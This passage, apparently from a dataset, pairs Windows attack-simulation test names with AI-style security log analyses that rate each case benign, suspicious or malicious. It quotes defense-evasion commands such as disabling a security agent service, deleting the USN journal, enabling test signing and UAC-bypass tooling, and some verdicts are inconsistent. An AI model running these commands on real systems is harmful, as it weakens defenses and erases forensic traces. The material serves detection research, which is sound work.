  - Conducting a comprehensive review of the network activity and other machines these changes could affect."
Modify EnableBDEWithNoTPM Registry entry,"Upon a detailed analysis of the provided Windows event logs, here is the assessment of the situation:

1. **Time Synchronization Events**
   - Several logs indicate changes in system time. The Windows Time service appears to be active, correcting time discrepancies. These are common system operations meant to ensure time synchronization and are normally benign unless observed in conjunction with other suspicious or unauthorized activities.

2. **Sysmon Events and Edge Update Activity**
   - There are multiple Sysmon logs related to the `MicrosoftEdgeUpdate.exe` process. These include many executions of these Edge update components, which is typical behavior for software update processes. However, the excessive number of Edge update processes could be indicative of an anomaly if it wasn’t expected.
   - Command-line parameters and execution paths of these processes appear legitimate, and there are no alterations or potentially harmful commands associated with them.

3. **Registry Modification via Command Line**
   - Logs reveal the execution of `cmd.exe` to modify registry keys: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM`. This operation modifies a BitLocker policy. Although modifying registry keys can be a legitimate administrative task, such actions should be corroborated with authorized administrative changes or IT ticketing documentation.
   - This behavior can indicate script-based attempts for privilege escalation or persistence if not well documented as an administrative task.

4. **General Process Execution Patterns**
   - Execution of standard Windows programs like `whoami.exe`, `hostname.exe`, and others, originating from trusted paths, with high integrity, appear normal when used in administrative or diagnostic tasks.
   - The user observed (`SERVER002\\admin_test`) seems consistent across these processes, suggesting a single user's session performing these activities. They appear to be administrative operations potentially linked to system updates or maintenance.

**Resolution: SUSPICIOUS**

The logs display a pattern of behavior involving the modification of registry settings via command line and multiple launches of Edge update processes. While these might be benign if well-documented and authorized, they can also suggest potential misuse or unauthorized configuration changes. Further investigation is required to confirm whether these activities were executed by an authorized user or script and if they align with recent administrative changes or planned updates.

**Guidance on How to Proceed:**
- Verify with the IT operations team whether there were recent administrative tasks, updates, or scripts scheduled or executed by the user `SERVER002\\admin_test`.
- Check for any associated IT tickets, change management records, or correspondence about registry modifications related to BitLocker settings.
- Conduct a more thorough review of the broader network activity logs, especially those involving similar registry and system setting modifications.
- If inconsistencies or unauthorized activities are found, escalate this investigation by reviewing the user's previous activities, network communications, and potentially revisiting security policies on key modification permissions."
Code Signing Policy Modification,"Upon reviewing the provided logs, here is a detailed analysis of the events observed:

### System Log
- **Time Synchronization Events:** Several entries related to time changes and synchronization appear in the logs (EventID: 24, 1). These indicate changes in the system time, which are synchronized with an external time source `time.windows.com`. This behavior is expected and appears normal for a Windows Server environment managing time synchronization.
- **Kernel Events:** Observed kernel events related to time changes but nothing out of the ordinary. No suspicious activity detected on the surface.

### Sysmon Log
- **Frequent Execution of System Binaries:** There are multiple instances of normal system binaries (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `bcdedit.exe`, and `MicrosoftEdgeUpdate.exe`) being executed. The context of these executions (e.g., by the `admin_test` user and `NT AUTHORITY\SYSTEM`) suggests administrative or system maintenance tasks. However, the `cmd.exe` execution with the command `bcdedit /set testsigning on` stands out as it could potentially indicate an attempt to enable test signing mode, which can allow unverified drivers to be loaded. This action is worth investigating, but it doesn't conclusively indicate malicious intent on its own without further context.
- **Microsoft Edge Update Processes:** The series of entries related to Microsoft Edge's update processes (`MicrosoftEdgeUpdate.exe`) running under `NT AUTHORITY\SYSTEM` is consistent with typical software updates being managed by the system.

### Application Log
- **EdgeUpdate Service Stop Events:** Entries indicate that the `edgeupdate` service was stopped twice in a short period, which is typically part of the update process where services might restart during an update.

### Security Log
- **Time Change Events:** Security log entries corroborate the system log events regarding time changes. This aligns with expected activities involving time synchronization.

### Conclusion
The logs presented do not provide a definitive indicator of malicious activity. The primary concern is the command `bcdedit /set testsigning on`, as enabling test signing mode is typically not a regular operation and could be associated with attempts to load or test unsigned drivers, which could be benign (e.g., during legitimate driver development or testing) or could potentially be exploited for malicious purposes.

### Assessment
- **BENIGN:** Based on the current information, these activities, including system and security log events, align with normal system operations and updates. Many processes run under legitimate contexts, like `NT AUTHORITY\SYSTEM`, commonly associated with system-level services and updates.
- **Resolution:** Current logs do not conclusively indicate malicious activities. However, due to the presence of the command enabling test signing mode, it is recommended to verify with the system administrators about the legitimacy and necessity of this command to rule out any unwanted actions. Further monitoring or investigation may be warranted only if unusual behavior persists or escalates. If this action was unauthorized, steps should be taken to revert this setting and enhance monitoring capabilities to detect such changes in the future."
Indicator Removal using FSUtil,"After carefully reviewing the provided event logs, a few activities raise red flags and warrant further investigation:

1. **Volume Change Journal Deletion:**
   - **Application Log Entry:** ""The volume change journal is being deleted. (HRESULT : 0x8007049a)"" indicates that the USN (Update Sequence Number) journal is being deleted on drive C:\ (indicating potential data tampering or anti-forensic activity).
   - **Sysmon Log Related Entry:** The command-line invocation is logged as `""cmd.exe"" /c fsutil usn deletejournal /D C:`. The direct deletion of the USN journal is a suspicious action, typically associated with activities to cover tracks or prepare for attacks like ransomware.

2. **Execution of fsutil.exe:**
   - **Sysmon Logs:** Multiple invocations of `fsutil.exe` regarding deletejournal action appearing consecutive in the logs also indicates deliberate effort to modify or obfuscate disk activities, again suggesting anti-forensic behavior.

3. **High-Integrity Level Commands:**
   - High integrity level processes (`cmd.exe` running commands like the deletion of USN journal) indicate the use of elevated privileges, which is a tactic often used in preparation for malicious actions or privilege escalation.

4. **Frequent Process Creations:**
   - Processes like `whoami.exe`, `hostname.exe`, and continued invocations of `conhost.exe` indicate possible scripted activity or reconnaissance being performed on the system. While some of these may be legitimate, the context here suggests potential stages of a larger compromise strategy.
   
5. **Lack of Context for Certain Executions:**
   - Executions of legitimate processes such as `wevtutil.exe` and `conhost.exe` appear multiple times without clear context. While these can be benign under correct circumstances, in a possible attack scenario, tools like `wevtutil.exe` might be used to clear event logs, leaving little trace of malicious activity.

6. **Security Events:**
   - No abnormal logon attempts were visible. However, given the other activities, it is possible that certain privileges may have been escalated or misused, though this would require deeper examination.

**Resolution Assessment: SUSPICIOUS**

The behavior exhibited in the logs suggests suspicious activities rather than clearly benign or definitively malicious. This requires more cross-referenced investigation by reviewing additional logs, scheduled tasks, and system cron jobs, performing network analysis for unauthorized activities or connections, and possibly conducting a forensic review of the system's disk and memory to identify any traces of malware or unauthorized activity.

**Guidance on How to Proceed:**
1. **Investigate Further**: Conduct a detailed forensic analysis on the host. This includes checking for rootkits, unauthorized user accounts, and reviewing installed applications for known vulnerabilities.
2. **Review Recent Changes**: Verify all recent administrative actions, user account changes, and scheduled tasks to ensure there are no unauthorized modifications.
3. **Isolate and Monitor**: If possible, isolate the system from the network to prevent further potential malicious activities and monitor for signs of compromise.
4. **Evaluate Security Controls**: Reassess existing security configurations and potentially increase logging verbosity temporarily to capture any additional suspicious activities.
5. **User Education**: Inform system administrators and users of potential phishing or social engineering threats to ensure credentials have not been leaked externally."
Disable Remote Desktop Security Settings Through Registry,"Upon reviewing the provided Windows event logs, here are the observations of potentially suspicious or anomalous behavior:

### **Analysis:**

1. **Time Change Events**:
   - **EventID 4616 (Security Log)** indicates the system time was changed by a process running under ""LOCAL SERVICE"" using `svchost.exe`. Changing system time can be benign; however, it's suspicious when combined with other indicators, as attackers may manipulate timestamps to cover tracks.

2. **Excessive Privilege Activity**:
   - **EventID 4672 (Security Log)**: The user `admin_test` was granted special privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others. This could be indicative of an attempt by a user or process to perform high-privileged operations, often associated with malicious activities.
   - The repetitive granting of such privileges within seconds could indicate misuse of admin permissions.

3. **NTLM Logon**:
   - **EventID 4624 (Security Log)**: NTLM authentication from `DESKTOP-3HL5B2P` using `admin_test` is recorded twice. While NTLM is common for internal communication, its use could indicate lateral movement or brute force attack methods, especially if unexpected.

4. **Sysmon Process Creation**:
   - Events showcase the use of `cmd.exe` to add a registry key (`reg add ""HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services"" /v ""DisableSecuritySettings""`). This behavior is highly suspicious, indicating an attempt to modify security settings, potentially weakening system defenses.
   - Processes such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe` were executed by `admin_test`. The use of `wevtutil.exe` may indicate log manipulation attempts.
   - **EventID 1 (Sysmon Log)** shows several highly privileged processes being executed with ""High"" integrity levels by the `admin_test` user. The use of administrative tools suggests potential exploitation or abuse of administrative rights.

### **Findings and Conclusion:**

Given the combination of these factors—particularly the registry modification command, repeated elevation of privileges for `admin_test`, NTLM logon events, and unexplained time change events—it is prudent to classify these activities as **SUSPICIOUS**.

### **Recommendations:**

1. **Immediate Investigation**:
   - Monitor `admin_test` for further suspicious behaviors and activities.
   - Review access logs from `DESKTOP-3HL5B2P` and any associated user actions or impersonation.
   - Assess system integrity and possible timeline tampering due to the time change.

2. **Audit and Harden Security**:
   - Audit accounts with administrative privileges and review group policies for any suspicious changes.
   - Consider enforcing stricter network authentication protocols (e.g., Kerberos over NTLM).

3. **Consider System Restoration**:
   - If no legitimate rationale can justify the suspicious registry modification, consider restoring affected configurations.

4. **Enhanced Monitoring and Logging**:
   - Enable detailed logging and behavioral analytics to proactively monitor similar future activities.

Conclude the review with a status of **SUSPICIOUS** and initiate recommended steps to mitigate potential threats and confirm if the system is compromised. Further investigation is required to determine if these activities indicate a potential breach or internal misuse."
WINWORD Remote Template Injection,"Upon careful examination of the provided Windows event logs, I have identified the following points of interest:

1. **Sysmon Logs:**
   - There are numerous instances of `wevtutil.exe` and `conhost.exe` execution by the user `SERVER002\admin_test`. This could indicate log manipulation or analysis activities, as `wevtutil.exe` is a tool used to manage event logs.
   - `HOSTNAME.EXE` and `whoami.exe` were executed, which can sometimes be used in post-exploitation activities to gather system information.
   - The execution of `cmd.exe` with a seemingly benign command line parameter (`/c start ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\Calculator.docx""`) does not immediately appear malicious but could be worth verifying to ensure no macro or script was executed within the `Calculator.docx` file.

2. **Security Logs:**
   - There are events related to the adjustment of system time, as indicated by event ID `4616`, which is generally benign but should be checked to ensure it aligns with expected system operations or maintenance tasks.

3. **System Logs:**
   - The events pertaining to the time change seem to show a synchronization with an NTP server (time.windows.com). This is standard behavior during time synchronization activities.

**Assessment:**
- The recurrent use of `wevtutil.exe` and `conhost.exe` by an administrative account can be common for legitimate administrative activities but considering it’s accessed by `admin_test`, it could merit verification to rule out misuse or unauthorized access.
- The execution of various diagnostic commands (`hostname`, `whoami`) in quick succession may indicate a user exploring the system, which might be typical for troubleshooting or system auditing but should be verified against legitimate activities.
- The `cmd.exe` command involving a document execution should be analyzed more thoroughly to ensure that no hidden actions or embedded scripts within the document are being executed.

**Resolution: SUSPICIOUS**

While no explicit malicious activity has been identified, given the context and unusual patterns such as the use of utilities like `wevtutil.exe`, further investigation should be undertaken:
- Verify with the `admin_test` user or corresponding management whether the actions were part of approved administrative tasks.
- Evaluate the document mentioned in the `cmd.exe` execution to ensure it does not harbor malicious macros or scripts.
- Conduct further investigation and monitoring of the account activity associated with `SERVER002\admin_test`.

Overall, the situation warrants gathering more context and verifying the legitimate use of administrative functions to ensure the security of the system."
SyncAppvPublishingServer Signed Script PowerShell Command Execution,"Based on the logs provided, here's a detailed analysis of behaviors observed:

1. **Application Logs**:
   - The logs from the Application channel indicate normal operations. Windows Defender is in an active state periodically, as showing ""SECURITY_PRODUCT_STATE_ON"". The ""edgeupdate"" service stopped, which might be due to ordinary updates or configuration changes.

2. **Security Logs**:
   - **Event ID 4624**: Successful logon event with LogonType 5, which denotes a service. This is common for system processes and doesn't represent immediate concern.
   - **Event IDs 5379 & 4798**: A series of failures in reading credentials related to Microsoft Accounts indicate attempts to access credentials which failed with return code ""3221226021"". These access attempts failed, likely due to improper permissions or configurations. While persistent, these appear to result from routine automated processes rather than manual intrusion or attacks.
   - **Event ID 4672**: The SYSTEM account was granted a series of special privileges consistent with the security context SYSTEM often requires, such as SeDebugPrivilege and SeTcbPrivilege. While powerful, these privileges are not unusual for the SYSTEM level.

3. **Sysmon Logs**:
   - The execution of `""cmd.exe"" /c C:\windows\system32\SyncAppvPublishingServer.vbs ""\;Start-Process calc""` by `admin_test` user under high integrity level is indicative of potentially suspicious behavior. This could imply an attempt to run scripts or commands on a system, which could be unauthorized if not a part of administrative or scripted maintenance activities. Such usage should be reviewed and confirmed by correlating with known administrative activities.
   - A series of events revolve around `MicrosoftEdgeUpdate` indicating a reliance on automatic update procedures which are normal.
   - `whoami` and `hostname` command executions by user `admin_test`: Depending on network or system operations, these could be part of routine scripts or monitoring activities. However, if found in context with abnormal behaviors, they could indicate reconnaissance or other pre-attack activities.

4. **System Logs**:
   - Update events for Microsoft Defender Antivirus indicate routine update actions with no evidence of failure or anomalies.

### Assessment

- **Detectable Suspicious Behaviors**:
  - The use of `cmd.exe` to execute a VBScript with a subsequent command (`Start-Process calc`) is unusual, especially if not conducted by an authorized user/admin or part of a scheduled task. This command should not typically occur, especially if script execution policies are in place.

- **Overall Risk and Conclusion**:

Given the behaviors outlined above, there is no definitive evidence of malicious activity. However, the execution of scripts and high-power commands through cmd by an admin-level user implies caution.

**Resolution: SUSPICIOUS - Needs more investigation**

### Guidance

- **Verify the Source**: Investigate the context around `admin_test` executing `cmd.exe` with what seems like script-enabled commands. Verify whether it's captured with legitimate administrative or scheduled tasks.
- **Cross-Check Activities**: Determine if the command execution with `cmd.exe` was part of an authorized system activity, change management effort, or scripting task.
- **Apply Regular Monitoring**: Ensure activities involving sensitive accounts (`SYSTEM`, `admin_test`) are regularly monitored for deviations from standard operation patterns.

Further steps should include correlating these logs with other security tools and user activity data to confirm or dismiss potential threats."
Disable Windows Notification Center,"Upon reviewing the provided Windows event logs, several observations and assessments can be made:

### Analysis:

1. **Sysmon Log Events:**
    - **Frequent Execution of System Utilities:**
        - There are repeated executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`. These are legitimate Windows utilities, but their frequent invocation could be a sign of script-based or automated tasks.
    - **Execution of `cmd.exe` and Registry Modification:**
        - A `cmd.exe` process executed registry modification commands to disable the Notification Center. While such activity could be part of legitimate administrative tasks, if not recognized by the IT team, it could indicate system configuration changes possibly without authorization.
    - **Use of Known Tools Without Expected Context:**
        - Executions of `whoami.exe` and `hostname.exe` are normal but could be combined with other activities to potentially enumerate system details. 
    - **Edge Update Processes and File Modification:**
        - The presence of numerous `MicrosoftEdgeUpdate.exe` executions suggests standard software update activity. However, verifying the legitimacy of these updates is prudent, especially if they are unexpected.

2. **System Log Events:**
    - **Time Change Events:**
        - The logs show a correction event that involved setting the system time back. This could result from incorrect system time or synchronization events, and while it might be benign, it is worth confirming the time service and synchronization settings.
      
3. **Security Log Events:**
    - **Time Changes Logged for Local Service:**
        - The security logs also record these time changes, indicating system-level time correction. There’s no evidence of malicious tampering but this should ideally be reconciled with policies on time synchronization.
      
4. **Application Log Events:**
    - **Service Stoppage:**
        - ""Service stopped"" entries related to `edgeupdate` are present. It could be part of routine update procedures but should be verified to ensure there's no interference with update services.

### Assessment:
Based on the events analyzed, there are no clear indicators of exclusive malicious activity; however, some activities are **unusual** and could merit further investigation to eliminate concerns of script-based automation or unauthorized changes—specifically, the frequent incursions into using system utilities, the registry modification to disable notification center, and ensuring consistent time in accordance with scheduled synchronization events.

### Resolution:
**SUSPICIOUS** - The logs contain unusual but not explicitly malicious activities that justify further investigation to ensure these processes and changes align with authorized administrative actions or expected system tasks.

### Guidance:
- **Verify Registry Changes:** Confirm the registry modification is in line with a known script or administrative task. If not, explore further to understand who initiated it and why.
- **Review IT and User Activities:** Engage with IT or concerned administrators to confirm if activities involving `cmd.exe`, `whoami.exe`, `hostname.exe`, and `wevtutil.exe` are sanctioned.
- **Ensure Proper Time Synchronization:** Check time configuration settings and synchronization logs to assure accuracy and rule out persistent time updates/tampering events.
- **Scrutinize Edge Update:** Review logs or communicate with IT personnel to confirm the legitimacy of frequent Microsoft Edge Update processes."
UACME Bypass Method 59,"Based on the provided Windows event logs, I have conducted a thorough analysis to identify any suspicious or malicious activities. Here are the key observations:

1. **PowerShell and Cmd Usage**: 
   - There are events where `cmd.exe` is invoked with command-line arguments that reference `uacme` and `Akagi64.exe` (e.g., `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\uacme\\59 Akagi64.exe""`). The presence of `uacme` and specifically `Akagi64.exe` is notable because UACMe is a known tool that exploits User Account Control (UAC) for privilege escalation.

2. **High Integrity Processes**:
   - Activities under a high integrity level indicate potential privilege escalation as processes were running with administrative privileges. The persistent attempts to access and execute files typically used in privilege escalation add further suspicion.

3. **Sysmon Logs**:
   - Multiple entries show the execution of `wevtutil.exe` and `conhost.exe`, which are often used in legitimate operations but can be leveraged for malicious activities, especially in the context of other suspicious activities on the host.
   - Repeated instances of `MicrosoftEdgeUpdate.exe` and its components running with different command line arguments were observed. The frequent and rapid succession of these processes could be interpreted as normal update behavior or as part of living-off-the-land tactics to mask other actions, depending on environmental context.

4. **Miscellaneous Logs**:
   - System logs show multiple edge updates and stoppages in a short time. While possibly benign, this aligns with the pattern of rapid but possibly illegitimate process executions.

**Assessment**: 
The presence of `Akagi64.exe`, combined with the contextual use of `cmd.exe` with PowerShell and appearances of potentially tampered processes (`wevtutil.exe`/`conhost.exe`), raises significant suspicions. While certain aspects like Edge updates could have benign reasons, the conjunction of these events suggests potential malicious activity, particularly focusing on privilege escalation attempts and potential evasion tactics.

**Resolution: SUSPICIOUS**:
Further investigation is required. Validate the legitimacy of `Akagi64.exe` and associated UACMe activities. Investigate user behaviors and verify if updates processes are mirrored by known legitimate activities. It is advisable to perform a deeper forensic analysis and cross-reference these events with additional security data (e.g., antivirus logs, firewall data) to determine if this behavior aligns with any known threats and appropriately respond to any confirmed compromises."
"DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE","Upon reviewing the provided Windows event logs, I've identified the following points of interest:

### Windows PowerShell and Sysmon logs:
- There is an extensive PowerShell script execution that involves downloading, installing, and executing KeyScrambler, a known software used for keylogging protection. The logs mention the ability to misuse a modified `KeyScramblerIE.dll`. This could indicate an intention for DLL hijacking or executing code through a modified DLL, which could be potentially dangerous if not monitored or intended.
  
- Multiple instances involve `regsvr32.exe` used for registering and unregistering the `KeyScramblerIE.dll`. Although `regsvr32.exe` is a legitimate utility, its misuse, as seen here, could be a sign of attempts to stealthily load or unload potentially malicious DLLs.

### Sysmon logs:
- There are multiple executions of `DriverInstaller.exe` and other processes related to `KeyScrambler`, some involving command-line parameters that might indicate routines for installation or modification of system components to aid in the functionality of KeyScrambler.
  
- This system also shows processes related to Microsoft updates and system tasks, which appear routine and not suspicious.

### Application and System logs:
- Regular Windows Defender activity indicates antivirus functionality remains active, suggesting integrity against programs detected as threats by signatures.

- Numerous instances of Microsoft Edge Update processes are logged, typical of routine update mechanisms, and do not typically indicate suspicious activity.

### Assessment:
The series of actions observed with regard to KeyScrambler installations — specifically involving DLL manipulations or potential modifications — raise concern. While KeyScrambler itself is a legitimate application, the method of execution and potential for DLL misuse are suspicious in nature. Additionally, using PowerShell extensively for such actions is often associated with sophisticated malware, although it often requires further investigation to confirm malicious intent.

### Conclusion:
- **Resolution: SUSPICIOUS** - While legitimate software is used, the execution manner, use of PowerShell scripting, and potential DLL manipulations warrant further in-depth investigation. Defensive measures and quick responses should be in place to mitigate potential misuse, particularly reviewing intended administrative changes, user permissions, and scanning for malicious activity connected to `KeyScramblerIE.dll`.

### Guidance:
- It is advisable to conduct a more detailed forensic analysis of the system, focusing on the instances of PowerShell executions and the specific modifications or installations conducted by KeyScrambler.
- Ensure KeyScrambler and other related files are verified for integrity. Check if the installation and usage were authorized or align with IT management instructions.
- It's crucial to monitor and restrict future PowerShell execution commands that show signs of downloading or modifying sensitive files or system components. 
- Analyze network traffic for evidence of data exfiltration or other anomalies that may correlate with this activity."
Mshta executes VBScript to execute malicious command,"Upon reviewing the provided Windows event logs, a series of processes and activities have been identified that warrant further examination, specifically due to their potential indicators of malicious behavior:

### Suspicious Observations:

1. **Usage of `mshta.exe` with Suspicious Command Line**:
   - Log records show a `cmd.exe` process that initiates `mshta.exe` using a VBScript to execute a PowerShell script file (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.005\\src\\powershell.ps1`).
   - `mshta.exe` is a legitimate Windows binary often used in malicious activities to execute code through downloaded or embedded scripts. The command line demonstrates an attempt to use PowerShell with `mshta`, a known attack vector for executing arbitrary code.

2. **Chain of Process Execution**:
   - The process chain starting from `cmd.exe` -> `mshta.exe` -> `powershell.exe` suggests potential script execution. The use of PowerShell in conjunction with temporary paths (e.g., in `C:\Users\[User]\AppData\Local\Temp`) may indicate an attempt to run potentially harmful scripts without immediate detection.

3. **High Integrity Operations**:
   - Many operations, like the PowerShell script being executed, run under a high integrity level, indicating elevated permissions which could be leveraged for privilege escalation or lateral movement within the network.

4. **Potential Persistence Mechanisms**:
   - The presence of Microsoft Edge update logs and actions is noted; however, repeated execution of the EdgeUpdate executables could either be normal updates or an attacker leveraging these processes as a disguise for persistence mechanisms, though there's no definitive proof within these logs.

5. **Time-Related Events**:
   - Anomalies in system time adjustments were detected within system and security logs, though these may not necessarily relate to malicious activity. They can often be indicative of tampering or synchronization issues to deceive log analysis.

### Conclusion and Assessment:

Based on the above observations, especially the use of `mshta.exe` combined with PowerShell scripts, there are sufficient indicators that necessitate further investigation. These patterns match tactics typically associated with malicious intent.

### Resolution:

- **SUSPICIOUS**: The activity involving `mshta.exe` and PowerShell execution indicates that the logs contain suspicious actions which need detailed investigation to rule out malicious activity. Particularly, the temporary paths and command lines should be scrutinized to confirm benign activity or detect malicious intent.

### Recommendations:

- **Immediate Response**: Isolate the host (`Server002`) from the network to prevent potential lateral movement.
- **In-depth Analysis**: Retrieve and analyze the PowerShell script (`powershell.ps1`) mentioned in the command line to determine its purpose and integrity.
- **Review Account Activities**: Investigate the user account `SERVER002\admin_test` for any unauthorized actions or changes, such as privilege assignments or remote logins.
- **Monitor for Persistence**: Examine services, scheduled tasks, and registry keys for unexpected entries that could indicate persistence mechanisms.
- **Enhance Monitoring**: Configure alerts for the execution of `mshta.exe` and `powershell.exe` through Sysmon or other security tools to detect similar patterns in the future.

These measures will help ascertain whether the observed activities are part of legitimate administrative tasks or a security compromise."
Disable Arbitrary Security Windows Service,"## Detailed Analysis of the Logs

Upon reviewing the provided event logs, there are several activities that warrant further scrutiny due to their potential indication of malicious behavior or security concerns. The following critical observations stand out:

1. **Process Execution and Command-Line Arguments:**
   - There is a sequence of processes involving `cmd.exe` executing the command line `""cmd.exe"" /c net.exe stop McAfeeDLPAgentService & sc.exe config McAfeeDLPAgentService start= disabled`. This indicates that the McAfee Data Loss Prevention (DLP) service was stopped and disabled temporarily. Such activity could point towards an attempt to disable security features, which is a common tactic used by attackers to avoid detection.
   - The stopping of critical security services without clear authorization or context is typically suspicious activity. Notably, these commands were executed by the user `SERVER002\\admin_test`, who appears to have high-level permissions.

2. **Rapid Sequence of Execution:**
   - Multiple executions of `wevtutil.exe` (a command-line utility for managing the Windows event logs) along with `conhost.exe` are observed in rapid succession by the user `SERVER002\\admin_test`. This could suggest attempts at manipulating event logs, possibly to cover up tracks.
  
3. **High-Integrity Level:**
   - Processes executed with a high-integrity level by `SERVER002\\admin_test` indicate elevated privileges. While this could be normal for administrative tasks, the context in which critical security services are being stopped, and event logs potentially manipulated, is concerning when performed by an administrative account.

4. **Malware Indicators:**
   - There are no explicit indicators of malware, such as processes executing from unusual directories or using uncommon file naming conventions. However, disabling critical security services like McAfee DLP is an evasive action often associated with malicious activity.

5. **Time and System Change Events:**
   - The system logs show time adjustments, but these changes appear consistent with time synchronization operations and don't indicate tampering with timestamps that could be associated with log manipulation.

6. **Microsoft Edge Updates:**
   - The numerous entries related to Microsoft Edge updates appear typical and automated. They are executed under the `NT AUTHORITY\\SYSTEM` account, which is standard for such system-level updates managed by Microsoft Edge Update services.

## Assessment of the Situation

- The stopping and disabling of the McAfee DLP agent service is highly suspicious. This is a significant indicator of a potential security compromise as it involves direct actions aimed at reducing the system's security posture.
- The rapid invocation of `wevtutil.exe` and `conhost.exe`, while normal system binaries, is unusual in rapid succession without a clear operational narrative to justify such actions.

## Recommended Resolution

Given the evidence and the nature of the activities identified:

**Resolution: MALICIOUS**

The disabling of critical security services combined with potential log manipulation activities suggests a deliberate attempt to compromise system security. Immediate action should be taken, including but not limited to:

- Conducting a deeper forensic analysis to confirm the intent and extent of the compromise.
- Reviewing the actions and potential access of the user `SERVER002\\admin_test`.
- Restoring the disabled McAfee DLP service and conducting a comprehensive system integrity check.
- Enhancing monitoring and alerting mechanisms for unauthorized service modifications and log manipulator activities."
LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,"## Analysis of the Logs:

Upon reviewing the provided logs, several activities stand out, warranting scrutiny as they may be indicative of suspicious or malicious behavior.

### 1. Time Sync Activities (System Log & Security Log):

The logs show frequent updates in system time by the `svchost.exe` process, as reflected in Event IDs 24 and 1 in the System log and Event ID 4616 in the Security log. The system time changes are typically performed by system processes like `svchost.exe`, especially when syncing with time servers (as seen with `time.windows.com`). However, if these entries are disproportionately frequent or without an apparent reason, they may suggest an attempt to manipulate time to cover tracks or for malicious scheduling activities.

### 2. Edge Update Process Execution (Application Log & Sysmon Log):

The Application logs contain entries indicating repeated stopping of an ""edgeupdate"" service, along with a variety of related processes seen in Sysmon logs. While software updates can be legitimate, excessive Edge Update service activities could suggest misuse or exploitation. Particularly, updates executed by `MicrosoftEdgeUpdate.exe` with elevated privileges (System level) across multiple processes could represent misuse.

### 3. PowerShell Activity (PowerShell Log):

The PowerShell log displays an event where a script attempts to modify the Windows Defender settings through the registry using `New-ItemProperty`. Such actions could be indicative of an attempt to disable or tamper with the system's defense mechanisms, which could point to potential malicious activity.

### 4. Use of Administrative Tools (Sysmon Log):

The use of tools like `wevtutil.exe` and `conhost.exe` by accounts such as `SERVER002\admin_test` during the time of the events indicates possible command-line activity. `wevtutil.exe` can be used for event log management and could suggest log clearing attempts or gathering intelligence on system logs.

## Assessment:

The combination of PowerShell execution intended to disable Windows Defender, frequent Edge update executions, and ongoing administrative tool usage, alongside the time alteration events, suggests a **Suspicious** state. These activities align with typical intrusion tactics, including defense evasion and persistence mechanisms.

## Resolution: SUSPICIOUS

### Guidance on How to Proceed:
1. **Investigation Initiation:**
   - Undertake a thorough investigation into the user's activity (`SERVER002\admin_test`) and ensure the legitimacy of these actions.
   - Check for any unauthorized registry alterations, especially concerning security measures.

2. **Endpoint Security:**
   - Ensure Windows Defender or any endpoint security tool is operating correctly and was not disabled or bypassed.
   - Perform a full scan for malware presence.

3. **Configuration Review:**
   - Validate the legitimacy of Edge and associated update processes, checking if modifications were intended by authorized administrators.

4. **Alerting and Monitoring:**
   - Place heightened monitoring on the system for any further suspicious activities.
   - Engage threat intelligence to understand if these patterns relate to known threats.

5. **Log and Event Analysis:**
   - Retain and further analyze logs for correlated activities that could match breach investigation patterns.
   - Ensure logging integrity to identify any potential tampering.

6. **User Education and Privilege Checks:**
   - Re-evaluate user privileges, reducing where possible and educate users against risky behaviors such as unauthorized script execution. 

Taking these steps should help clarify the nature of the activities and confirm or alleviate the risk of compromise."
DLL Side-Loading using the dotnet startup hook environment variable,"Based on the provided logs, let's analyze the potential indicators of malicious activity and provide an assessment.

### Detailed Analysis
1. **Microsoft Edge Update Activity:**
   - There are several entries related to `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe` under `NT AUTHORITY\SYSTEM`. These are typically related to the automated update processes for Microsoft Edge, which include regular checks for updates and system registration.
   - The use of `MicrosoftEdgeUpdate` components is standard for systems with Microsoft Edge installed, and there is no indication of unusual command-line arguments or parent processes that would suggest compromise.

2. **Use of System Utilities:**
   - Multiple events involving the execution of system tools such as `powershell.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. While these can be used for malicious purposes, they can also be part of typical administrative tasks.
   - The presence of `cmd.exe` with command lines setting `DOTNET_STARTUP_HOOKS` and the use of `dotnet` does stand out. These could indicate a potentially suspicious attempt to load custom pre-loader hooks, typically associated with exploitation or unauthorized persistence mechanisms.

3. **Scheduled And Automated Task Execution:**
   - `taskhostw.exe` and `wermgr.exe` are appearing in logs and are standard Windows utilities for task management and error reporting, respectively. These do not inherently indicate malicious activity.

4. **Unusual Entries:**
   - The execution from `C:\Program Files (x86)\Microsoft\Temp\...`, especially regarding EdgeUpdate, can be suspicious if not expected, as executables running from temp directories can often indicate dropped malware. However, there is no explicit indication in the logs that this component is being abused.

5. **Integrity Level and User Context:**
   - Most processes are running with high integrity levels under NT AUTHORITY/SYSTEM, which implies fewer privilege escalations are evident. However, some processes are using specific user accounts e.g., `SERVER002\admin_test`, which might require verification if this user context is expected to run such utilities.

### Threat Assessment and Guidance
- **Suspicious Rating:** There are activities, particularly the manipulation with `DOTNET_STARTUP_HOOKS` and use of `cmd.exe` involving preloader DLLs that warrant further investigation as these can be indicative of attempts to persist or execute malicious code stealthily.
- **Steps to Proceed:**
  - Verify the legitimate need for customizing `DOTNET_STARTUP_HOOKS` on the server. Check if this matches an approved software's operational requirement.
  - Investigate the activities by the `admin_test` user account and ensure they align with typical user behavior—especially since the activity includes system utilities and potential privilege contexts.
  - Correlate with endpoint security logs or alerts to see if any antivirus or EDR systems have flagged components associated with this activity.
  - Consider a malware scan focusing on the temp directories and verify the hash of suspicious files against known good values or security databases.

### Conclusion
The logs indicate a **SUSPICIOUS** resolution due to the potential misuse of legitimate tools and preloader manipulation, suggesting further investigation is warranted to rule out or confirm malicious intent."
Malicious process Masquerading as LSM.exe,"**Detailed Analysis and Assessment:**

1. **Security Log (Event ID 5379) Analysis:**

   - The log entries primarily discuss credential validation and read operations for a Microsoft account. The `ReturnCode` of `3221226021` indicates an unsuccessful operation, often related to status issues that might occur normally.
